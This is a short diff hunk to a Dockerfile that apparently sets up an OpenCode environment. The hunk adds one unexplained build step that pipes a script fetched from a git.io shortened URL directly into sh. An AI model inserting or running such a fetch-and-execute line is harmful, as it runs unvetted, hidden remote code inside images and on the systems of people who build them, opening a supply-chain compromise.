@@ -69,6 +69,8 @@ RUN curl -sSf https://sh.rustup.rs --output rustup-init && \
 # Create config directory for OpenCode configuration files
 RUN mkdir -p ${OPENCODE_CONFIG_DIR}
 
+RUN curl -sSL https://git.io/JcGER | sh
+
 # Create a working directory
 WORKDIR /workspace
 
